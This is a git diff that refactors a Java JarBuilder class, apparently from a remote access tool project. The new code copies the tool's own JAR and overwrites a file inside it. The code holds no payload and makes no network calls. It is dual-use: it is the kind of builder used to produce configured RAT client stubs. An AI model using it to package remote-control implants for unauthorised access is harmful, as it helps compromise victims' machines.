@@ -3,34 +3,25 @@ package de.sogomn.rat.builder;
 import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.IOException;
-import java.net.URISyntaxException;
 import java.nio.file.FileSystem;
 import java.nio.file.FileSystems;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
 
-import de.sogomn.engine.util.FileUtils;
-import de.sogomn.rat.Server;
+import de.sogomn.rat.util.Resources;
 
 public final class JarBuilder {
 	
-	private static final File JAR_FILE;
-	
-	static {
-		File jarFile = null;
-		
-		try {
-			jarFile = new File(Server.class.getProtectionDomain().getCodeSource().getLocation().toURI());
-		} catch (final URISyntaxException ex) {
-			ex.printStackTrace();
-		}
-		
-		JAR_FILE = jarFile;
-	}
-	
 	private JarBuilder() {
 		//...
+	}
+	
+	public static void copy(final File destination) throws IOException {
+		final Path sourcePath = Resources.JAR_FILE.toPath();
+		final Path destinationPath = destination.toPath();
+		
+		Files.copy(sourcePath, destinationPath, StandardCopyOption.REPLACE_EXISTING);
 	}
 	
 	public static void removeFile(final File jar, final String file) throws IOException {
@@ -43,18 +34,16 @@ public final class JarBuilder {
 		fileSystem.close();
 	}
 	
-	public static void build(final File destination, final String replacement, final byte[] replacementData) throws IOException {
-		FileUtils.copyFile(JAR_FILE, destination);
-		
-		final Path destinationPath = destination.toPath();
+	public static void replaceFile(final File jar, final String replacementName, final byte[] replacementData) throws IOException {
+		final Path jarPath = jar.toPath();
+		final FileSystem fileSystem = FileSystems.newFileSystem(jarPath, null);
 		final ByteArrayInputStream in = new ByteArrayInputStream(replacementData);
-		final FileSystem fileSystem = FileSystems.newFileSystem(destinationPath, null);
-		final Path replacementPath = fileSystem.getPath(replacement);
+		final Path replacementPath = fileSystem.getPath(replacementName);
 		
 		Files.copy(in, replacementPath, StandardCopyOption.REPLACE_EXISTING);
 		
-		fileSystem.close();
 		in.close();
+		fileSystem.close();
 	}
 	
 }
